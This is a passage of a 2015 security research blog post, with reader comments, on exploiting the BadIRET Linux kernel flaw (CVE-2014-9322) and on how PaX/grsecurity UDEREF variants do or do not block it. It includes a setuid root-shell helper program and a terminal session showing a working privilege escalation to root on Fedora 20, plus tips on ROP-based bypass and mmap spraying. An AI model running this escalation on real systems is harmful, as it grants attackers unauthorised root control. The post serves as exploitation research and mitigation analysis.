<ol>
– slow / weak legacy implementation<br>
– strong implementation on Sandy Bridge and later<br>
– fast / weak implementation on Sandy Bridge and later
</ol>
<p>First implementation of UDEREF on AMD64 was “weak” implementation and information about it was described by PaX team here:</p>
<p><a href="http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html" target="_blank">http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html</a></p>
<p>I will quote the essential part of it:</p>
<blockquote><p>“(…) so what does UDEREF do on amd64? on userland-&gt;kernel transitions it basically<br>
unmaps the original userland address range and remaps it at a different address<br>
using non-exec/supervisor rights (so direct code execution as used by most<br>
exploits is not possible at least). (…)”</p></blockquote>
<p>and next:</p>
<blockquote><p>“(…) UDEREF/amd64 doesn’t ensure that the (legitimate) userland accessor<br>
functions cannot actually access kernel memory when only userland is allowed<br>
(some in-kernel users of certain syscalls can temporarily access kernel memory<br>
as userland, and that is enforced on UDEREF/i386 but not on amd64). so if<br>
there’s a bug where userland can trick the kernel into accessing a userland<br>
pointer that actually points to kernel space, it’ll succeed, unlike on i386.</p>
<p>the other bad thing is the presence of the userland shadow area. this has<br>
two consequences: 1. the userland address space size is smaller under UDEREF<br>
(42 vs. 47 bits, with corresponding reduction of ASLR of course), 2. this<br>
shadow area is always mapped so kernel code accidentally accessing its range<br>
may not oops on it and can be exploited (such accesses can usually happen only<br>
if an exploit can make the kernel dereference arbitrary addresses in which<br>
case the presence of this area is the least of your concerns though).(…)”</p></blockquote>
<p>&nbsp;</p>
<p><em>== weak UDEREF ==</em><br>
This means it works essentially similar to SMEP. So how to exploit CVE-2014-9322 under this specific implementation of UDEREF? You just need to change the ROP. Instead of disabling SMEP bit in CR4 register and execute code from the user land, implement full shellcode as ROP. It is possible and it won’t be stop by weak implementation of UDEREF.</p>
<p>&nbsp;</p>
<p><em>== “new” UDEREF ==</em><br>
Why strong implementation of UDEREF is different and why does it require Sandy Bridge architecture?<br>
Yes, that’s the fun part. I haven’t seen any official write-up regarding “new” UDEREF. I wasn’t even aware about those changed since I was playing with that exploit <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>
<p>Strong implementation of UDEREF using Sandy Bridge++ feature called as PCID to make ‘tags’ in TLB. By doing it UDEREF may completely separate user land from kernel (via creating new PGD tables):</p>
<pre>static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
{
++#if defined(CONFIG_X86_64) &amp;&amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd = get_cpu_pgd(smp_processor_id(), kernel);
+             for (i = USER_PGD_PTRS; i &lt; 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) &amp;&amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] = PCID_USER;
+                             asm volatile(__ASM_INVPCID : : "d"(&amp;descriptor), "a"(INVPCID_SINGLE_CONTEXT) :
"memory");
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
+                                     descriptor[0] = PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : "d"(&amp;descriptor),
"a"(INVPCID_SINGLE_CONTEXT) : "memory");
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
+}
+             } else
+#endif
</pre>
<p>In the end context run in kernel mode will NOT see any usermode pages. This implementation I personally believe is much stronger than SMAP. Why?</p>
<ol>
1. You can't just disable one bit in CR4 register to fully turn off this mitigation<br>
2. In case of SMAP, you can see userland pages (there is existing Page Tables translating userland addresses. 'P' bit is set) but you just can't touch it. In "new" UDEREF you don't see userland at all (PGD is completely different for kernel context and there is no Page Tables describing userland addresses. 'P' bit is unset).
</ol>
<p>This version of UDEREF was firstly introduced on grsecurity version 3.0 in February 2014. Good work! Will be nice if PaX/grsecurity may publish some details of their research and great implementation <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>
<p>Btw. In both cases result of touching userland addresses is the same - #PF will be generated <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"><br>
Btw2. The same "strong" UDEREF functionality may be achieved without hardware PCID feature. The main difference is performance. Without hardware support for PCID it should be a mess from the performance point of view.</p>
<p>&nbsp;</p>
<p><em>== Summarizing ==</em><br>
This vulnerability can be exploited under UDEREF and can NOT be exploited under "new" UDEREF which is enabled on Sandy Bridge++ architecture.</p>
<p>In fact you can still use this vulnerability to fully DoS machine under "new" UDEREF? How? It's quite funny and tricky, you can force infinitive loop of #PF <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> As soon as kernel enters to the do_general_protection() function it will try to read GDT via GS base by executing following instruction:</p>
<pre>    0xffffffff8172910e <do_general_protection+30>:       mov    %gs:0xa880,%rbx</do_general_protection+30></pre>
<p>at this situation GS base is pointing to the userland memory. Because there is no PTE entry for that address (kernel context doesn't see userland at all), #PF will be generated. page_fault() function will be executed and following:</p>
<pre>page_fault -&gt; do_page_fault -&gt; __do_page_fault -&gt; restore_args</pre>
<p>it will try to read GDT again and next #PF will be generated and so on... so on... so on... <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> So yes, you can still crash the kernel but there is no way to do anything else because there is no even room for exploitation. Vulnerability has being stopped at principals.</p>
<p>&nbsp;</p>
<p><strong>4) Funny facts <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></strong></p>
<p>a) Some versions of libthread requires to create memory with RWX permission when you call pthread_create() function. This is not allowed under PaX/grsec hardening of mmap() and as soon as internal implementation pthread_create() will call mmap(), process will be killed <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> I met this situation on default installation of Ubuntu LTS where I was testing kernel with grsecurity hardening.</p>
<p>b) on kernel 3.11.10-301.fc20.x86_64 implementation of __switch_to() function using OSXSAVE extension (bit 18 in CR4 register) without checking if CPU has this extension or not:</p>
<pre>     0xffffffff81011714 &lt;__switch_to+644&gt;    xsaveopt64 (%rdi)</pre>
<p>__switch_to() is executed under disabled interrupts but if OSXSAVE extension is not enabled CPU will generate #UD and it will be deadlock. Before entering to __switch_to() instruction regardless disabling interrupts also there is locked runqueue which will never be unlocked in case of #UD.<br>
I wonder if someone hit this problem in real life <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>
<p>&nbsp;</p>
<p>c) Fedora 20 exploitation is pretty stable (source code available on my website):</p>
<pre>[pi3@localhost clean_9322]$ cat z_shell.c
#include <stdio.h>

int main(void) {

   char *p_arg[] = { "/bin/sh", NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv("/bin/sh",p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function ‘main’:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
               : "r"(4), "r"((int)p_to_d), "r"(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;&amp; Adam 'pi3' Zabrocki

                Usage: ./procrop <number>

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &amp;
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;&amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;&amp; Adam 'pi3' Zabrocki

                Usage: ./p_write8 <number>

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;&amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+  Done                    ./procrop 1
Segmentation fault (core dumped)
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$
</number></number></stdio.h></pre>
<p>&nbsp;</p>
<p>References:<br>
1) <a href="http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/" target="_blank">http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/</a><br>
2) <a href="https://rdot.org/forum/showthread.php?t=3341" target="_blank">https://rdot.org/forum/showthread.php?t=3341</a><br>
3) <a href="https://www.exploit-db.com/exploits/36266/" target="_blank">https://www.exploit-db.com/exploits/36266/</a><br>
4) <a href="http://blog.pi3.com.pl/?p=509" target="_blank">http://blog.pi3.com.pl/?p=509</a><br>
5) <a href="http://twitter.com/grsecurity/status/562363332079144960" target="_blank">http://twitter.com/grsecurity/status/562363332079144960</a><br>
6) <a href="http://twitter.com/grsecurity/status/562363788125831172" target="_blank">http://twitter.com/grsecurity/status/562363788125831172</a><br>
7) <a href="http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz" target="_blank">http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz</a><br>
8) <a href="http://seclists.org/oss-sec/2014/q4/1052" target="_blank">http://seclists.org/oss-sec/2014/q4/1052</a><br>
9) <a href="http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html" target="_blank">http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html</a></p>
<p>&nbsp;<br>
&nbsp;<br>
<strong>UPDATE:</strong> PCID based UDEREF was firstly introduced in August 2013 NOT in February 2014.<br>
&nbsp;<br>
&nbsp;<br>
Best regards,<br>
Adam 'pi3' Zabrocki</p>
<div style="clear:both;"></div>

		

		<div class="postmeta">

			<p> Filed Under <a href="http://blog.pi3.com.pl/?cat=4" rel="category">Bughunt</a>, <a href="http://blog.pi3.com.pl/?cat=5" rel="category">Exploiting</a>, <a href="http://blog.pi3.com.pl/?cat=6" rel="category">Ideas</a>&nbsp;</p>

		</div>

	 			

		<!--

		<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="http://blog.pi3.com.pl/?p=509"
    dc:identifier="http://blog.pi3.com.pl/?p=509"
    dc:title="Follow-up on Exploiting &#8220;BadIRET&#8221; vulnerability (CVE-2014-9322)"
    trackback:ping="http://blog.pi3.com.pl/wp-trackback.php?p=509" />
</rdf:RDF>
		-->

		

		<p class="class1">Comments</p>

		


<!-- You can start editing here. -->





<div id="commentblock">






	<ol class="commentlist">



	


		<li class="alt" id="comment-113236">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/79d6637a83b1e1f7683bd3b59edf21c0.png" srcset="http://1.gravatar.com/avatar/79d6637a83b1e1f7683bd3b59edf21c0?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pax.grsecurity.net/" rel="external nofollow ugc" class="url">PaX Team</a></span> on

			
			07.04.2015 </p>

                   	<div class="commenttext">

			<p>nice writeup ;). a few comments:</p>
<p>1. the PCID based UDEREF feature was released in August 2013 already. i’ve wanted to document it ever since on our blog but somehow i always managed to find something more important to do so far :P.</p>
<p>2. Ingo’s old 4:4 patch did something similar at the time for i386, and its performance impact wasn’t pretty (not to mention the silently fixed security bugs in it ;).</p>
<p>3. SMAP’s other weakness is that it’s controlled by EFLAGS.AC which is an easy attack surface since EFLAGS is so often written. also on newer kernels CR4 can be written on every context switch so cpu_tlbstate.cr4 is a new attack surface.</p>
<p>4. you get RWX thread stacks usually due to the GNU_STACK disaster which glibc takes upon itself to spread to threads too.</p>
<p>cheers,<br>
 PaX Team</p>

			</div>



		</li>



	


	


		<li class="" id="comment-113239">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/8e99683ba802047c37dcd601a6f36f84.png" srcset="http://2.gravatar.com/avatar/8e99683ba802047c37dcd601a6f36f84?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pi3.com.pl/" rel="external nofollow ugc" class="url">pi3</a></span> on

			
			07.04.2015 </p>

                   	<div class="commenttext">

			<p>Thanks for your comment and kind words! <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>
<p>1. So it is much earlier than I thought – sorry for wrong information on the oss-sec ;/ I’ll fix it here.<br>
   It would be really awesome if you find some time to write a few notes about your experience and challenges with PCID based UDEREF <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"><br>
2. May you point me some links to it? It sounds interesting, I would be happy to look at that work. Sounds interesting <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"><br>
3. Hm… interesting, AC flag weakness I was aware of, but didn’t know about modern kernel changes on context switching – cpu_tlbstate.cr4:</p>
<p><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/tlbflush.h" rel="nofollow ugc">http://lxr.free-electrons.com/source/arch/x86/include/asm/tlbflush.h</a></p>
<p>It looks quite promising <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> Since I don’t work with Linux kernel at work anymore I lost ability to follow most of the changes (lack of time). Especially from 3.xx I feel major changes in kernel exploded <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>
<p>4. Ah… so that’s the mystery… When I was playing with a weak UDEREF I was using sys_clone() instead of pthreads to bypass this problem. But I was very surprised about pthreads, because nowadays multithreading is everywhere and grsec/PaX is very popular on servers and nobody picked-up this problem. </p>
<p>Cheers,<br>
pi3</p>

			</div>



		</li>



	


	


		<li class="alt" id="comment-113240">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/79d6637a83b1e1f7683bd3b59edf21c0.png" srcset="http://1.gravatar.com/avatar/79d6637a83b1e1f7683bd3b59edf21c0?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pax.grsecurity.net/" rel="external nofollow ugc" class="url">PaX Team</a></span> on

			
			07.04.2015 </p>

                   	<div class="commenttext">

			<p>here’s the remnants of the 4:4 patches: <a href="http://people.redhat.com/mingo/4g-patches/" rel="nofollow ugc">http://people.redhat.com/mingo/4g-patches/</a> and i guess old RHEL carries them too. it was announced at <a href="http://marc.info/?l=linux-kernel&amp;m=105770479318745&amp;w=2" rel="nofollow ugc">http://marc.info/?l=linux-kernel&amp;m=105770479318745&amp;w=2</a> .</p>

			</div>



		</li>



	


	


		<li class="" id="comment-113241">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/8e99683ba802047c37dcd601a6f36f84.png" srcset="http://2.gravatar.com/avatar/8e99683ba802047c37dcd601a6f36f84?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pi3.com.pl/" rel="external nofollow ugc" class="url">pi3</a></span> on

			
			07.04.2015 </p>

                   	<div class="commenttext">

			<p>Thanks! <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>

			</div>



		</li>



	


	


		<li class="alt" id="comment-113287">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/8e29dc258c08c118e6c8808c3eeed6b2.jpeg" srcset="http://2.gravatar.com/avatar/8e29dc258c08c118e6c8808c3eeed6b2?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4">citypw</span> on

			
			07.05.2015 </p>

                   	<div class="commenttext">

			<p>Hi pi3, it’s an awesome write-up! Thanks for sharing such a great research….</p>
<p>There’s a typo error in the second-last paragraph of the chapter two:<br>
s/struct proc_dir_etry/struct proc_dir_entry/g</p>

			</div>



		</li>



	


	


		<li class="" id="comment-113291">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/8e99683ba802047c37dcd601a6f36f84.png" srcset="http://2.gravatar.com/avatar/8e99683ba802047c37dcd601a6f36f84?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pi3.com.pl/" rel="external nofollow ugc" class="url">pi3</a></span> on

			
			07.05.2015 </p>

                   	<div class="commenttext">

			<p>Thanks! Typo fixed, I believe there could be much more of typo ;p</p>

			</div>



		</li>



	


	


		<li class="alt" id="comment-113598">

                       

                                                

			<p class="class3"><span class="class4"><a href="https://zaufanatrzeciastrona.pl/post/weekendowa-lektura-2015-07-10-wszystko-przez-hacking-team/" rel="external nofollow ugc" class="url">Weekendowa Lektura 2015-07-10 – wszystko przez Hacking Team | Zaufana Trzecia Strona</a></span> on

			
			07.10.2015 </p>

                   	<div class="commenttext">

			<p>[…] Głębsza analiza&nbsp;CVE-2014-9322 […]</p>

			</div>



		</li>



	


	


		<li class="" id="comment-116458">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/753d59f4772d65302e142bec9f621aac.png" srcset="http://1.gravatar.com/avatar/753d59f4772d65302e142bec9f621aac?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4">question</span> on

			
			08.18.2015 </p>

                   	<div class="commenttext">

			<p>Hi, pi3</p>
<p>I saw below code in your PoC.</p>
<p>“””<br>
 long *root = mmap((void*)0x1000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);<br>
“””</p>
<p>It is a code fails. </p>
<p>mmap_min_addr default value is 4096 in the FC20_x86_64.</p>
<p>How can i mapping address 0x1000 in the FC20_x86_64 ?</p>

			</div>



		</li>



	


	


		<li class="alt" id="comment-117218">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/8e99683ba802047c37dcd601a6f36f84.png" srcset="http://2.gravatar.com/avatar/8e99683ba802047c37dcd601a6f36f84?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pi3.com.pl/" rel="external nofollow ugc" class="url">pi3</a></span> on

			
			08.30.2015 </p>

                   	<div class="commenttext">

			<p>4096 == 0x1000 so it’s allowed <img draggable="false" role="img" class="emoji" alt="😉" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f609.svg"> Even if you have mmap_min_addr higher you just need to spray more memory</p>

			</div>



		</li>



	


	


		<li class="" id="comment-132455">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/f32bd017a0d6d322f62f0b17c59e841a.png" srcset="http://0.gravatar.com/avatar/f32bd017a0d6d322f62f0b17c59e841a?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4">Kai</span> on

			
			12.01.2016 </p>

                   	<div class="commenttext">

			<p>Very useful! I tried the source code, however I can’t reproduce. What I got is double fault on procrop and then the system panic. I’m using a fedora 20 in a QEMU VM. Is there anything I missed?<br>
Thanks!</p>

			</div>



		</li>



	


	


		<li class="alt" id="comment-132640">

                       

                        <img alt="" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/8e99683ba802047c37dcd601a6f36f84.png" srcset="http://2.gravatar.com/avatar/8e99683ba802047c37dcd601a6f36f84?s=96&amp;d=mm&amp;r=g 2x" class="avatar avatar-48 photo" height="48" width="48" loading="lazy">                        

			<p class="class3"><span class="class4"><a href="http://pi3.com.pl/" rel="external nofollow ugc" class="url">pi3</a></span> on

			
			12.06.2016 </p>

                   	<div class="commenttext">

			<p>You should debug the kernel to understand the entire process of exploitation and find out why and where fault is generated.</p>

			</div>



		</li>



	


	


	</ol>



 







<p class="class1">Leave a Reply</p>






<form action="http://blog.pi3.com.pl/wp-comments-post.php" method="post" id="commentform">






<p class="label"><label for="author">Name (Required)</label><br>

<input type="text" name="author" id="author" value="" tabindex="1"></p>



<p class="label"><label for="email">Email Address (Required)</label><br>

<input type="text" name="email" id="email" value="" tabindex="2"></p>



<p class="label"><label for="url">Website</label><br>

<input type="text" name="url" id="url" value="" tabindex="3"></p>






<p class="label2"><textarea name="comment" id="comment" cols="40" rows="10" tabindex="4"></textarea></p>



<p><input name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment">

<input type="hidden" name="comment_post_ID" value="509"></p>



<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="9a91ea33b1"></p><p style="display: none !important;"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js" name="ak_js" value="1638466890181"><script>document.getElementById( "ak_js" ).setAttribute( "value", ( new Date() ).getTime() );</script></p><p class="cptch_block"><span class="cptch_title">CAPTCHA<span class="required"> *</span></span><script class="cptch_to_remove">
				(function( timeout ) {
					setTimeout(
						function() {
							var notice = document.getElementById("cptch_time_limit_notice_73");
							if ( notice )
								notice.style.display = "block";
						},
						timeout
					);
				})(120000);
			</script>
			<span id="cptch_time_limit_notice_73" class="cptch_time_limit_notice cptch_to_remove">Time limit is exhausted. Please reload the CAPTCHA.</span><span class="cptch_wrap cptch_math_actions">
				<label class="cptch_label" for="cptch_input_73"><span class="cptch_span"><input id="cptch_input_73" class="cptch_input cptch_wp_comments" type="text" autocomplete="off" name="cptch_number" value="" maxlength="2" size="2" aria-required="true" required="required" style="margin-bottom:0;display:inline;font-size: 12px;width: 40px;"></span>
					<span class="cptch_span">&nbsp;−&nbsp;</span>
					<span class="cptch_span"><img class="cptch_img " src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAMAAADDpiTIAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABhQTFRFo6Oj////39/fAAAAZGRkwcHBJycn7e3tU0HQEQAABdtJREFUeNrs3dFu00AURVGPx/b8/x8DojyAhGrXjpq5Z+13ECSLOXUSh6UrusVDAIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAAAOAhAEAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAAfCqx6KdbQWgYMcAILq1AWAAAEhtGwAYAAAMAACZVwANgOgGAAYAgNwrgAaAKwAADAAABgAAVwAAGAAADAAAGR0DAAMAgAEAwAAAkNfeADAAABgAAAwAAAYAgKwBaABEA9gBiAZwYwAACB8AAAq0AhANYGkAJAM42gAgGcC9AQAgfAAAmH0ABgDRAO4OAADhAwDA1G0DgGgA9wcAgPABAGDmAWgARANYAYgG8MgAABA+AACEDwAA4QMAQPgAADBnxwpANIDHBgCA8AEAYMoB+PQ9oAFA5T69D2QcOwDJA7BceJUAgHoD0I7uP40KHoCfBwAA0VcAR+9+CAwegP3S7YIAVBuAXwcAAMEDsF97pQiAqQagnToAAAgegKUDULYT7wGNA4DkK4DfB8CVdwsBmKf17AHQFy8EZQ5A27oTIPkKYO0ARA/ABkD0AOwXLhcBmKszd4J//AQIQOgAtKUDYABOcwGg2AD8uQQEIH4AAEgcgL+eSB8LrzUA7doAABA+AFc+EghAkQE4AKgK4PoAAFCpU3eC7//8GgCyBmAcAFQF8JUBACB7AK59fwAAb93+h